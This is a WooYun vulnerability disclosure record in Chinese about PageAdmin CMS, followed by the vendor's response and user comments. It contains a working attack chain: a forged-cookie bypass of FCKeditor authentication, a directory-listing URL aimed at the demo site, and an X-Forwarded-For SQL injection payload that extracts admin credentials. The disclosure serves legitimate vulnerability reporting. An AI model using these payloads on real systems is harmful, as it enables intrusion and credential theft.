{"id": 1965, "wybug_id": "wooyun-2014-061609", "wybug_title": "PageAdmin CMS最新版SQL注入", "wybug_corp": "PageAdmin", "wybug_author": "cmd", "wybug_date": "2014-05-20 22:49", "wybug_open_date": "2014-08-18 22:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向公众公开  简要描述： PageAdmin CMS最新版SQL注入 详细说明：  系统保存日志功能，没有过滤IP，导致了SQL注入漏洞// PageAdmin.Logpublic void Save(int SiteId, int IsMaster, string thetype, int state, string username, string description){\tstring clientIP = this.GetClientIP();\tConn conn = new Conn();\tstring connectionString = conn.Constr();\tOleDbConnection oleDbConnection = new OleDbConnection(connectionString);\toleDbConnection.Open();\tstring cmdText = string.Concat(new object[]\t{\t\t\"insert into pa_log([site_id],[task_id],[ismaster],[state],[thetype],[username],[url],[description],[ip],[thedate]) values(\",\t\tSiteId,\t\t\",0,\",\t\tIsMaster,\t\t\",\",\t\tstate,\t\t\",'\",\t\tthis.f(thetype),\t\t\"','\",\t\tthis.f(username),\t\t\"','\",\t\tHttpContext.Current.Request.RawUrl,\t\t\"','\",\t\tthis.f(description),\t\t\"','\",\t\tclientIP,\t\t\"','\",\t\tDateTime.Now,\t\t\"')\"\t});\tOleDbCommand oleDbCommand = new OleDbCommand(cmdText, oleDbConnection);\toleDbCommand.ExecuteNonQuery();\toleDbConnection.Close();}// PageAdmin.Logprivate string GetClientIP(){\tstring result;\tif (HttpContext.Current == null)\t{\t\tresult = \"127.0.0.1\";\t}\telse\t{\t\tHttpRequest request = HttpContext.Current.Request;\t\tstring text = request.ServerVariables[\"HTTP_X_FORWARDED_FOR\"];\t\tif (string.IsNullOrEmpty(text))\t\t{\t\t\ttext = request.ServerVariables[\"REMOTE_ADDR\"];\t\t}\t\tif (string.IsNullOrEmpty(text))\t\t{\t\t\ttext = request.UserHostAddress;\t\t}\t\tresult = text;\t}\treturn result;}可以看出IP是从HTTP_X_FORWARDED_FOR获取的，没有任何过滤，直接就插入到了数据库。因为要用报错的方法注入，access版无法注入，SQL SERVER才行。这个函数大多是是在对网站修改时才会调用，后台登陆刚好调用了这个函数有些网站把后台登陆地址改掉了，这里我们可以用一种方法来找出来，用fckeditor列目录漏洞，列出来，漏洞文件是/e/incs/fckeditor/editor/filemanager/connectors/aspx/connector.aspx这里和2.x版本的漏洞差不多，只检测了Cookie，代码过长就不贴了它检测了Master是否存在，然后检测Master[UID]是不是存在，然后根据UID来查询用户表，如果查到了用户，就检测是不是admin组的，如果是，就把UID对应用户的最后登录时间用她自带的Md5函数加密，和Master[Valicate]做比较，相同就能绕过，但是这里有个问题，如果UID是不存在的，他就会用空字符串\"\"来和Master[Valicate]做比较，所以只要我们提交一个不存在的UID，再用Md5加密\"\"作为Master[Valicate]的值，就可以绕过这里的验证。利用下面这个aspx计算出加密后的字符串是17b62103fec08a1333215b141bb18217f11c8e13a<% @ Page language=\"c#\"%><% @ Import NameSpace=\"System.Data\"%><% @ Import NameSpace=\"System.Data.OleDb\"%><% @ Import NameSpace=\"PageAdmin\"%><script Language=\"C#\" Runat=\"server\"> protected void Page_Load(Object sender,EventArgs e){    Response.Write(new Md5().Get_Md5(\"\"));}</script>最后用Cookie: Master=1&UID=9999&Valicate=17b62103fec08a1333215b141bb18217f11c8e13a就能绕过了。fckeditor.net版大都有遍历目录的漏洞，就是把当前目录设置成d:/，就能查看d盘的文件如果没权限查看磁盘根目录，也可以把当前目录改成!，让他报错，就能知道网站路径。http://demo.pageadmin.net/e/incs/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=!\n\n\n\n这样就找到了网站后台路径，然后登陆后台，用burp修改X-Forwarded-For头来进行注入。   漏洞证明：  设置HTTP头X-Forwarded-For: 8.8.8.8','');select 1 from pa_member where (select top 1 username+':'+userpassword from pa_member where m_group='admin')>0--然后打开网站后台，登陆网站\n\n   修复方案：  用session   版权声明：转载请注明来源 cmd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-05-25 14:14 厂商回复： CNVD将会整理最近所有PageAdmin漏洞，通过公开联系渠道向软件生产厂商通报处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-16 17:42 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力啊这个。居然uid对应的用户不存在的时候就匹配空……那么恶搞的。不过此时不存在的这个UID到底是对应了哪个用户的权限？admin的权限？没注意看这里    \n     2014-06-16 18:35 |    \t\tcmd \t\t\t( 普通白帽子  |\t\t\t        Rank:192 漏洞数:18        )\t\t \n  Fck这里是单独的权限验证代码，所以有这个问题，后台的验证，除非知道用户的最后登录时间才能伪造，所以除非用注入注出来，不然利用不了    \n     2014-06-16 22:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cmd 哈哈，最后登录时间有办法搞的。我那个漏洞就是    \n     2014-09-26 06:52 |    \t\tgod lucky \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 本人擅长：Au、Ai、Fw、Dw、Fl、Br、Ae、Pr...)\t\t \n  @cmd 看了你之前的 2.0版本绕过后台文章 但2.0比3.0的后台简单 如何拿shell 求教    \n     2014-10-10 16:28 |    \t\tPageAdmin(乌云厂商)\t\t \n  PageAdmin 2014-10-10版已经修复次问题    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}